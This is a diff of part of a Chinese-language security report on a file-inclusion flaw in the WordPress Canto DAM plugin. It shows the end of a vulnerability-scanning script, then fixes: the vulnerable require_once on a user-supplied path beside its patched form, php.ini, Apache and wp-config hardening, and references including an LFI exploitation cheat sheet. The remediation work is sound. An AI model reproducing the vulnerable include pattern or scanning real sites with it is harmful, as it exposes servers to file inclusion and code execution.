+                print(f"[+] VULNERABLE: {url}")
+        except:
+            pass
+```
+
+---
+
+## 8. 缓解措施
+
+### 8.1 立即修复
+
+**修复 LFI 漏洞：**
+```php
+// 修复前（脆弱代码）
+require_once($_REQUEST['wp_abspath'] . '/wp-admin/admin.php');
+
+// 修复后（使用 ABSPATH 常量）
+require_once(ABSPATH . '/wp-admin/admin.php');
+```
+
+**禁用远程文件包含：**
 ```ini
 ; php.ini 配置
 allow_url_include = Off
-open_basedir = /var/www/html
-display_errors = Off
+allow_url_fopen = Off
+```
+
+### 8.2 防御性配置
+
+**Apache 配置：**
+```apache
+# 禁止直接访问插件库文件
+<Directory "/var/www/html/wp-content/plugins/canto/includes/lib/">
+    Deny from all
+</Directory>
+
+# 禁用目录列表
+Options -Indexes
+```
+
+**WordPress 安全加固：**
+```php
+// wp-config.php 添加
+define('DISALLOW_FILE_EDIT', true);
+define('FORCE_SSL_ADMIN', true);
 ```
 
 ---
 
-**文档版本：** 1.0  
-**最后更新：** 2025-10-29  
-**适用目标：** WordPress Canto DAM 插件 v3.0.4  
-**关联漏洞：** AUTHZ-VULN-01 至 AUTHZ-VULN-05
+## 9. 参考资源
+
+- [OWASP Local File Inclusion](https://owasp.org/www-community/vulnerabilities/Local_File_Inclusion)
+- [OWASP Remote File Inclusion](https://owasp.org/www-community/vulnerabilities/Remote_File_Inclusion)
+- [PHP LFI 利用技术](https://www.highon.coffee/blog/lfi-cheat-sheet/)
